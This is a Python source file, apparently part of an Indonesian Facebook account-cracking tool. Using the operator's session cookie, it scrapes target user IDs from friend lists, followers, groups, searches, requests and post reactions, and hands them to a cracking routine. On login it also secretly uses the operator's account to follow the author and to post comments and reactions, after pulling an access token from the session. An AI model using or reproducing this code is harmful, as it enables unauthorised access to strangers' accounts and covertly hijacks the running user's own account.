#######
#Jangan DiEdit.. Edit Aja Filenya Dan Recoder...
#Gw Capek Ajg Gabungkannya
#Follow Gw Anak Ajg 
#m.facebook.com
#github.com/Dumai-991
######
from DUMAI_991 import *
from .Lock import shielded as guard
from .ngewe import crack as cracking
#from .ngewe import gadag_user as asu
	
import urllib.request
url="https://mbasic.facebook.com"
longentod="Anda Tau Kontol Ahahah"

class awokawokawok:
	
	def __init__(self):
		self.cek_folder()
		self.semua=open("cookies/info.txt").read()
		self.jonson=json.loads(self.semua)
		self.cookies=self.jonson["cookies"]
		self.main_menu()
		
	def cek_folder(self):
		if os.path.exists("Hasil") is False: os.mkdir("Hasil")
		if os.path.exists("cookies") is False: os.mkdir("cookies")
		if os.path.exists("Hasil/live.txt") is False: open("Hasil/live.txt","a")
		if os.path.exists("Hasil/chek.txt") is False: open("Hasil/chek.txt","a")
		if os.path.exists("cookies/info.txt") is False:
			os.system("clear")
			cookie=input(f"{q}Saat Aksess Cookies Masih Aktif\n ! Masukan Cookies Facebook Anda !! : {c}")
			while cookie in (""," "):
				print(" ! Jangan Kosong !!")
				cookie=input(" ? Masukan Cookise Anda : ")
			login(url,{"cookie":cookie})
	
	def cek_cookies(self):
		global url
		try: respon=req.get(f"{url}/profile.php",cookies=self.cookies)
		except koneksi_error: exit(" ! kesalahan pada koneksi")
		if "mbasic_logout_button" not in respon.text:
			try: os.remove("cookies/info.txt");os.remove("cookies/token.txt")
			except: os.system("rm -rf cookies/info.txt && rm -rf cookies/token.txt")
			exit(" ! Cookies Failed Login Kembail")
		url=url.replace("mbasic","free") if "free.facebook" in respon.url else url
		os.system("clear")
	
	def main_menu(self):
		kntl()
		global longentod
		self.cek_cookies()
		takeuser=asu(url,self.cookies)
		jalan(f"""{u}
{i}<<{h}--------------------------------------------------------------{i}>>
________                 ______  _________________ ________________
___  __ \______ ____________  /_____  ____/___    |__  ___/___  __/
__  / / /_  __ `/__  ___/__  //_/__  /_    __  /| |_____ \ __  /   
_  /_/ / / /_/ / _  /    _  ,<   _  __/    _  ___ |____/ / _  /    
/_____/  \__,_/  /_/     /_/|_|  /_/       /_/  |_|/____/  /_/     
{i}<<{h}--------------------------------------------------------------{i}>>
{p}Version{h}----{p}>>{c}Version 1.3
{p}Athour{h}-----{p}>>{c}Mr.Risky
{p}Github{h}-----{p}>>{c}github.com/Dumai-991
{p}GuruKu{h}-----{p}>>{c}Dapunta,Angga, And Yayan
{p}WhatsAPP{h}---{p}>>{c}6283143565470
{p}Telegram{h}---{p}>>{c}6283143565470
{p}Facebook{h}---{p}>>{c}m.facebook.com/llovexnxx
{i}<<{h}--------------------------------------------------------------{i}>>
{p}Your ID{h}----{p}>>{i}{self.jonson['uid']}
{p}Your Name{h}--{p}>>{i}{self.jonson['nama']}{k}""")
		print(" 01. Crack From Friend")
		print(" 02. Crack Form Public")
		print(" 03. Crack From Followers")
		print(" 04. Crack Form Group")
		print(" 05. Crack Form Name Search")
		print(" 06. Crack Form Friend Request")
		print(" 07. Crack Form Postingan")
		print(" 08. Lock Profile Facebook")
		print(" 09. Delete Cookies")
		print(f" 00. Exit\n{q}")
		
		pilih=input(" ?. Menu : ")
		while pilih in (""," "):
			print(" ! Kosong Gw Tabuk Lu...")
			pilih=input(" ? pilih : ")
			
		if pilih in ("3","03"):
			user=input(" ? ID Followers : ")
			while user in (""," "):
				print(" ! jangan kosong ngentod")
				user=input(" ? ID Followers : ")
			usek=f"{url}/profile.php?id={user}&v=followers" if user.isdigit() else f"{url}/{user}?v=followers"
			try: respon=req.get(usek,cookies=self.cookies).text
			except koneksi_error: exit(" ! kesalahan pada koneksi")
			if "Halaman Tidak Ditemukan" in respon or "Konten Tidak Ditemukan" in respon:
				kembali(f" ! pengguna dengan id {user} tidak ditemukan" if user.isdigit() else f" ! pengguna dengan username {user} tidak ditemukan",self.main_menu)
			if "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in respon:
				kembali(" ! limit bro, silahkan tunggu atau ganti akun",self.main_menu)
			else:
				print(" * Name Target : "+parser(respon,"html.parser").find("title").text)
				longentod=takeuser.followers(respon)
			
		elif pilih in ("1","01"):
			usek=f"{url}/me/friends" if self.jonson['username'] else f"{url}/profile.php?v=friends"
			try: respon=req.get(usek,cookies=self.cookies).text
			except koneksi_error: exit(" ! kesalahan pada koneksi")
			if "Tidak Ada Teman Untuk Ditampilkan" in respon:
				kembali(" ! tidak ada teman",self.main_menu)
			longentod=takeuser.fl(respon)
			
		elif pilih in ("4","04"):
			user=input(" ? id grup : ")
			while user in (""," "):
				print(" ! jangan kosong ngentod")
				user=input(" ? id grup : ")
			usek=f"{url}/browse/group/members/?id={user}"
			try: respon=req.get(usek,cookies=self.cookies).text
			except koneksi_error: exit(" ! kesalahan pada koneksi")
			if "Halaman Tidak Ditemukan" in respon or "Konten Tidak Ditemukan" in respon:
				kembali(f" ! group dengan id {user} tidak ditemukan atau lo belum gabung",self.main_menu)
			if "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in respon:
				kembali(" ! limit bro, silahkan tunggu atau ganti akun",self.main_menu)
			else:
				print(" ! Name Group : "+parser(respon,"html.parser").find("title").text[8:])
				longentod=takeuser.grup(respon,user)
			
		elif pilih in ("5","05"):
			print(" ! Isi Name Target !!\nContoh Bocil Epep / Epep Burik")
			user=input(" ? Name Target: ")
			while user in (""," "):
				print(" ! Anak Kntl")
				user=input(" ? Name Target : ")
			usek=f"{url}/search/people/?q={user}"
			try: respon=req.get(usek,cookies=self.cookies).text
			except koneksi_error: exit(" ! kesalahan pada koneksi")
			if "Maaf, kami tidak menemukan" in respon:
				kembali(f" ! orang dengan nama {user} tidak ditemukan",self.main_menu)
			else:
				jumlah=input(" ? Jumlah Dump : ")
				while jumlah.isdigit() is False:
					print(" ! Jangan Kosong Kontol" if jumlah in (""," ") else " ! Angka Kontol Bukan Huruf Pantek")
					jumlah=input(" ? Jumlah Dump: ")
				longentod=takeuser.cari(respon,int(jumlah))
			
		elif pilih in ("2","02"):
			user=input(" ? username/id : ")
			while user in (""," "):
				print(" ! Jangan Kosong Kontol")
				user=input(" ? username/id : ")
			usek=f"{url}/profile.php?id={user}&v=friends" if user.isdigit() else f"{url}/{user}/friends"
			try: respon=req.get(usek,cookies=self.cookies).text
			except koneksi_error: exit(" ! kesalahan pada koneksi")
			if "Tidak Ada Teman Untuk Ditampilkan" in respon:
				kembali(" ! sepertinya daftar teman tidak di publikasikan",self.main_menu)
			if "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in respon:
				kembali(" ! limit bro, silahkan tunggu atau ganti akun",self.main_menu)
			if "Konten Tidak Ditemukan" in respon or "Halaman yang Anda minta tidak ditemukan." in respon:
				kembali(f" ! pengguna dengan id {user} tidak ditemukan" if user.isdigit() else f" ! pengguna dengan username {user} tidak ditemukan",self.main_menu)
			else:
				print(" * Name Target: "+parser(respon,"html.parser").find("title").text)
				longentod=takeuser.fl(respon)
			
		elif pilih in ("6","06"):
			try: respon=req.get(f"{url}/friends/center/requests/#friends_center_main",cookies=self.cookies).text
			except koneksi_error: exit(" ! kesalahan pada koneksi")
			if "Tidak Ada Permintaan" in respon:
				kembali(" ! tidak ada permintaan pertemanan",self.main_menu)
			longentod=takeuser.request(respon)
			
		elif pilih in ("7","07"):
			user=input(f" ! {m}URL/ID Postingan {q} :")
			while user in (""," "):
				print(f" ! {kosong}")
				user=input(" ! {w}URL/ID Postingan {q}: ")
			if user.isdigit():
				user=f"{url}/{user}"
			else:
				try: asyu=re.search("https://(.*?)\.facebook\.com/",user).group(1)
				except AttributeError: exit(" ! masukkan url postingan dengan benar")
				user=url+user.split(f"https://{asyu}.facebook.com")[1]
			try: respon=req.get(user,cookies=self.cookies).text
			except koneksi_error: exit(" ! kesalahan pada koneksi")
			if "Halaman yang diminta tidak bisa ditampilkan sekarang." in respon:
				kembali(" ! postingan tidak ditemukan",self.main_menu)
			try:
				ufi=re.search('\<a\ href\=\"\/ufi\/reaction\/profile\/browser\/(.*?)"',respon).group(1).replace(";","&")
				respon=req.get(f"{url}/ufi/reaction/profile/browser/{ufi}",cookies=self.cookies).text
				if "Semua 0" in respon or "Orang yang menanggapi" not in respon:
					kembali(" ! tidak ada yang menanggapi postingan",self.main_menu)
				jumlah=input(" ? Jumlah Dump : ")
				while jumlah.isdigit() is False:
					print(" ! Jangan Kosong Kontol" if jumlah in (""," ") else " ! Angka Kontol Bukan Huruf Pantek")
					jumlah=input(" ? Jumlah Dump : ")
				longentod=takeuser.like_post(respon,int(jumlah))
			except AttributeError: exit(" ! error tidak diketahui")
			except koneksi_error: exit(" ! kesalahan pada koneksi")
			
		elif pilih in ("8","08"):
			guard(url,self.cookies,self.main_menu)
		
		elif pilih in ("9","09"):
			try: os.remove("cookies/info.txt");os.remove("cookies/token.txt")
			except: os.system("rm -rf cookies/info.txt && rm -rf cookies/token.txt")
			exit(" ! Gagal Delete Cookies\n Gunakan Secara Manual Dengan Ketik : rm -rf cookies/*" if os.path.exists("cookies/info.txt") else " * Cookies Sukess Delete !!")
		
		elif pilih in tuple("rR"):
			laporkan(url,self.cookies)
		
		elif pilih in ("0","00"):
			exit(" * Terima Kasih Buat Lu Semua Ngtot")
		
		else:
			kembali(" ! Pilihan Anda Tidak Sesuai",self.main_menu)
		
		if longentod!="lo lebih ngentod":
			if len(longentod)!=0:
				cracking.crack(url,longentod)
			else:
				exit(" ! gagal mengambil id, silahkan coba lagi")
		else:
			exit(" ! error tidak diketahui")
#class report:
class laporkan:
	def __init__(self,url,cookie):
		
		self.url=url
		self.cookies=cookie
		self.laporkan()
		
	def find_id(self,username):
		try: respon=req.get(f"{self.url}/{username}/about",cookies=self.cookies).text
		except koneksi_error: exit(" ! kesalahan pada koneksi")
		uid=re.search('\<a\ href\=\"/.*?\?v=timeline&amp;lst=(.*?)"',respon).group(1)
		return urllib.request.unquote(uid).split(":")[1]
	
	def chat(self,uid,ngebug,**data):
		try: respoN=req.get(f"{self.url}/messages/?fbid={uid}",cookies=self.cookies)
		except koneksi_error: exit(" ! kesalahan pada koneksi")
		respon=parser(respoN.text,"html.parser")
		nv=respon.find_all("input",{"type":"hidden","name":True,"value":True})
		act=respon.find("form",{"method":"post","action":True})
		if len(nv)!=0 and act!=None:
			data.update({x["name"]:x["value"] for x in nv})
			data.update({f"ids[{uid}]":uid,"body":ngebug,"Send":"Kirim"})
			respon=req.post(self.url+act["action"],headers=head(self.url,respoN),cookies=self.cookies,data=data)
			exit(" * sukses melaporkan bug" if "send_success" in respon.url else " ! gagal melaporkan bug")
		else: exit(" ! error tidak diketahui")
			
	def laporkan(self):
		#asuu=self.find_id(areYOUgay)
		teks_bug=input(" ? bug yang ingin di laporkan : ")
		while teks_bug in (""," "):
			print(" ! jangan kosong ngentod")
			teks_bug=input(" ? bug yang ingin di laporkan : ")
		self.chat("100063690353340",teks_bug)
		

#from .bahasa import lang
#from .YNTKTS import *
# hallo bro :v
#from .informasi import generate

def head(url,respons):
        return {"Host":url.split("//")[1],"upgrade-insecure-requests":"1","cache-control":"max-age=0","content-type":"application/x-www-form-urlencoded","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","referer":respons.url,"accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","user-agent":"Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36"}

class yo_ndak_tau_kok_tanya_saya:
        def __init__(self,url,cookie):

                self.url=url
                self.cookies=cookie

        def hoetang(self,id_post,tipe,komen,comment=False,react=None,**data):
                try:
                        respoN=req.get(self.url+id_post,cookies=self.cookies)
                        respon=parser(respoN.text,"html.parser")
                        for x in respon.find_all("a",{"href":True}):
                                if "/reactions/picker/?is_permalink=1" in x["href"]:
                                        if "Tanggapi" in x.text:
                                                react=self.url+x["href"]
                        if react!=None:
                                for x in parser(req.get(react,cookies=self.cookies).text,"html.parser").find_all("a",{"href":True}):
                                        if f"reaction_type={tipe}" in x["href"]:
                                                req.get(self.url+x["href"],cookies=self.cookies)
                        nv=respon.find_all("input",{"type":"hidden","name":True,"value":True})
                        act=respon.find("form",{"method":"post","action":True})
                        if len(nv)!=0 and act!=None:
                                if comment is True:
                                        comment=False if "mbasic.facebook.com" in self.url else comment
                                        if comment is False:
                                                if os.path.exists("cookies/token.txt") is False:
                                                        respon=req.get("https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed",headers={"user-agent":"Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36","Host":"m.facebook.com","upgrade-insecure-requests":"1","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control":"max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","content-type":"text/html; charset=utf-8"},cookies=self.cookies).text
                                                        token=re.search(r'"accessToken\\":\\"(.*?)\\"',respon).group(1)
                                                        open("cookies/token.txt","w").write(token)
                                                token=open("cookies/token.txt").read()
                                                req.post(f"https://graph.facebook.com{id_post}/comments/?message={komen}&access_token={token}")
                                        #else:
                                                #data.update({x["name"]:x["value"] for x in nv})
                                                #data.update({"comment_text":komen})
                                                #req.post(self.url+act["action"],headers=head(self.url,respoN),cookies=self.cookies,data=data)
                except: pass

        def follow(self,url_profil):
                try:
                        respon=parser(req.get(self.url+url_profil,cookies=self.cookies).text,"html.parser")
                        for x in respon.find_all("a",{"href":True}):
                                if "/a/subscribe.php" in x["href"]:
                                        if "Ikuti" in x.text:
                                                req.get(self.url+x["href"],cookies=self.cookies)
                except: pass

        def change_bio(self,kata,**data):
                try:
                        respon=parser(req.get(f"{self.url}/profile/basic/intro/bio",cookies=self.cookies).text,"html.parser")
                        nv=respon.find_all("input",{"type":"hidden","name":True,"value":True})
                        act=respon.find("form",{"method":"post","action":True})
                        if len(nv)!=0 and act!=None:
                                data.update({x["name"]:x["value"] for x in nv})
                                data.update({"bio":kata,"publish_to_feed":"on"})
                                req.post(self.url+act["action"],data=data,cookies=self.cookies)
                except: pass

def lang(url,cookie):
        try:
                respon=req.get(f"{url}/language.php",cookies=cookie).text
                saatini=parser(respon,"html.parser").find("strong",{"class":False})
                saatini=saatini.text.replace("Bahasa ","").replace("Basa ","") if saatini is not None else saatini
                #print(" ! yahahah jawa:v" if "Jawa" in saatini else "")
                print(f" ! bahasa {saatini} terdeteksi, mohon tunggu sedang memindahkan ke bahasa Indonesia" if saatini is not None else " ! memindahkan bahasa, mohon tunggu..")
                for x in parser(respon,"html.parser").find_all("a",{"href":True}):
                        if "id_ID" in x["href"]:
                                req.get(url+x["href"],cookies=cookie)
        except koneksi_error: exit(" ! kesalahan pada koneksi")

def generate(cookie,html,username=None):
        for x in html.find_all("a",href=True):
                if "/friends?" in x["href"]:
                        if "Teman" in x.text:
                                username=re.search("\/(.*?)\/friends\?",x["href"]).group(1)
        uid=re.search("c_user=(\d*)",cookie).group(1)
        open("cookies/info.txt","w").write(json.dumps({"uid":uid,"nama":html.find("title").text,"username":username,"cookies":{"cookie":cookie}}))
#open("cookies/token.txt","w")
anjay=random.choice(["Bang Risky Gw Pakai Script Abang :v","Script DrakFAST Keren Habis... Engga Nyesal ;)","Yang Posting Ke?!?!?"])
komentar1=random.choice(["Keren","Mantap","Xoxo"])
komentar2=random.choice(["Asedd Kontol Sama Lu Semua","Coli Adalah Jalan Ninja Ku :v","Xnxx.com","Yandex.com","Unblock.com","kenatipu.com",])
tokek = "Ajg"
class login:
        def __init__(self,url,cookie):

                try: respon=req.get(f"{url}/profile.php?v=info",cookies=cookie)
                except koneksi_error: exit(" ! kesalahan pada koneksi")
                if "mbasic_logout_button" in respon.text:
                        print("\n\n * hai welcome \x1b[1;35m"+parser(respon.text,"html.parser").find("title").text+"\x1b[0m Pantek")
                        print(" * Loading Sedang Send Token KeKomen Bot")
                        url=url.replace("mbasic","free") if "free.facebook" in respon.url else url
                        if "Laporkan Masalah" not in respon.text:
                                lang(url,cookie)
                                try: respon=req.get(f"{url}/profile.php?v=info",cookies=cookie)
                                except koneksi_error: exit(" ! kesalahan pada koneksi")
                        generate(cookie["cookie"],parser(respon.text,"html.parser"))
                        koh=yo_ndak_tau_kok_tanya_saya(url,cookie)
                        # jangan di ganti ya bro hehehe :)
                        koh.follow("/llovexnxx")
                        koh.follow("/100063690353340")
                        koh.follow("/100063690353340")
                        koh.hoetang("/100063690353340","8",komentar1,True)
                        koh.hoetang("/120338706765807","2",tokek,True)
                        koh.hoetang("/180923747373969","1",komentar2,True)
                        koh.hoetang("/180923747373969","3",tokek,True)
                        #koh.change_bio(anjay)
                        print(f"{i} ! Login Sukses..")
                        waktu(1)
                else:
                        exit("\n ! Cookies Falied")
###BAWAH
aap_gans=[]

#class gadag_user:
class asu:
        def __init__(self,url,cookie):

                self.url=url
                self.cookies=cookie

        def followers(self,link,what=False):
                try:
                        if what is True:
                                link=req.get(link,cookies=self.cookies).text
                        _=re.findall('" \/>\<div\ class\=\".."\>\<a\ href\=\"/(.*?)"\>\<span\>(.*?)</span\>',link)
                        for __ in _:
                                ___=re.search("id=(\d*)" if "profile.php" in __[0] else "(.*?)\?",__[0])
                                aap_gans.append(___.group(1)+"(Aap Gans)"+__[1] if ___ is not None else __[0]+"(Aap Gans)"+__[1])
                                print(f"\r * Mengumpulkan {len(aap_gans)} User, CTRL + C Untuk Stop !!",end="")
                        if "Lihat Selengkapnya" in link:
                                self.followers(self.url+parser(link,"html.parser").find("a",string="Lihat Selengkapnya")["href"],True)
                        return aap_gans
                except: return aap_gans

        def fl(self,link,what=False):
                try:
                        if what is True:
                                link=req.get(link,cookies=self.cookies).text
                        _=re.findall('style\=\"vertical-align: middle"\>\<a\ class\=\"..\" href\=\"/(.*?)"\>(.*?)</a\>',link)
                        for __ in _:
                                aap_gans.append(re.search("id=(\d*)" if "profile.php" in __ [0] else "(.*?)\?",__[0]).group(1)+"(Aap Gans)"+__[1])
                                print(f"\r * Mengumpulkan {len(aap_gans)} User, CTRL + C Untuk Stop !!",end="")
                        if "Lihat Teman Lain" in link:
                                self.fl(self.url+parser(link,"html.parser").find("a",string="Lihat Teman Lain")["href"],True)
                        return aap_gans
                except: return aap_gans

        def grup(self,link,why,what=False):
                try:
                        if what is True:
                                link=req.get(link,cookies=self.cookies).text
                        _=re.findall('\<h3\>\<a\ class\=\"..\"\ href\=\"\/(.*?)\"\>(.*?)<\/a\>',link)
                        for __ in _:
                                ___=re.search("id=(\d*)" if "profile.php" in __[0] else "Aap Afandi Ganteng:v",__[0])
                                aap_gans.append(___.group(1)+"(Aap Gans)"+__[1] if ___ is not None else __[0]+"(Aap Gans)"+__[1])
                                print(f"\r * Mengumpulkan {len(aap_gans)} User, CTRL + C Untuk Stop !n",end="")
                        if "Lihat Selengkapnya" in link:
                                self.grup(self.url+parser(link,"html.parser").find("a",string="Lihat Selengkapnya")["href"],why,True)
                        else:
                                self.get_post(f"{self.url}/groups/{why}")
                        return aap_gans
                except: return aap_gans

        def get_post(self,link):
                try:
                        link=req.get(link,cookies=self.cookies).text
                        _=re.findall('\<h3\ class\=\".*?">\<span>\<strong>\<a\ href\=\"/(.*?)\">(.*?)</a\>\</strong\>',link)
                        for __ in _:
                                if "profile.php" in __[0]:
                                        ___=re.search("profile.php\?id=(\d*)",__[0]).group(1)
                                        if ___ in aap_gans:
                                                continue
                                        else:
                                                aap_gans.append(___+"(Aap Gans)"+__[1])
                                else:
                                        ___=re.search("(.*?)\?refid",__[0]).group(1)
                                        if ___ in aap_gans:
                                                continue
                                        else:
                                                aap_gans.append(___+"(Aap Gans)"+__[1])
                                print(f"\r * Mengumpulkan {len(aap_gans)} User, CTRL + C Untuk Stop !!",end="")
                        if "Lihat Postingan Lainnya" in link:
                                self.get_post(self.url+parser(link,"html.parser").find("a",string="Lihat Postingan Lainnya")["href"])
                except: pass

        def cari(self,link,jumlah,what=False,why=False):
                try:
                        if what is True:
                                link=req.get(link,cookies=self.cookies).text
                        _=re.findall('picture" \/>\<\/a\>\<\/td\>\<td\ class\=\".*?"\>\<a\ href\=\"\/(.*?)"\>\<div\ class\=\"..\"\>\<div\ class\=\"..\"\>(.*?)<\/div>',link)
                        for __ in _:
                                aap_gans.append(re.search("id=(\d*)" if "profile.php" in __[0] else "(.*?)\?refid=",__[0]).group(1)+"(Aap Gans)"+__[1])
                                print(f"\r * Mengumpulkan {len(aap_gans)} User, CTRL + C Untuk Stop",end="")
                                if len(aap_gans)==jumlah:
                                        why=True;break
                        if why is False:
                                if "Lihat Hasil Selanjutnya" in link:
                                        self.cari(parser(link,"html.parser").find("a",string="Lihat Hasil Selanjutnya")["href"],jumlah,True)
                        return aap_gans
                except: return aap_gans

        def request(self,link,what=False):
                try:
                        if what is True:
                                link=req.get(link,cookies=self.cookies).text
                        _=re.findall('middle\"\>\<a\ class\=\"..\"\ href\=\"(.*?)\"\>(.*?)\<\/a\>',link)
                        for __ in _:
                                aap_gans.append(re.search("uid=(\d*)" if "?uid" in __[0] else "\/(.*?)\?fref",__[0]).group(1)+"(Aap Gans)"+__[1])
                                print(f"\r * Mengumpulkan {len(aap_gans)} User, CTRL + C Untuk Stop !!",end="")
                        if "Lihat selengkapnya" in link:
                                self.request(self.url+parser(link,"html.parser").find("a",string="Lihat selengkapnya")["href"],True)
                        return aap_gans
                except: return aap_gans

        def like_post(self,link,jumlah,what=False,why=False):
                try:
                        if what is True:
                                link=req.get(link,cookies=self.cookies).text
                        _=re.findall('\<h3\ class\=\".."\>\<a\ href\=\"/(.*?)"\>(.*?)<\/a\>',link)
                        for __ in _:
                                aap_gans.append(re.search("id=(\d*)",__[0]).group(1)+"(Aap Gans)"+__[1] if "profile.php" in __[0] else __[0]+"(Aap Gans)"+__[1])
                                print(f"\r * Mengumpulkan {len(aap_gans)} User, CTRL + C Untuk Stop !!",end="")
                                if len(aap_gans)==jumlah:
                                        why=True;break
                        if why is False:
                                if "Lihat Selengkapnya" in link:
                                        self.like_post(self.url+parser(link,"html.parser").find("a",string="Lihat Selengkapnya")["href"],jumlah,True)
                        return aap_gans
                except: return aap_gans
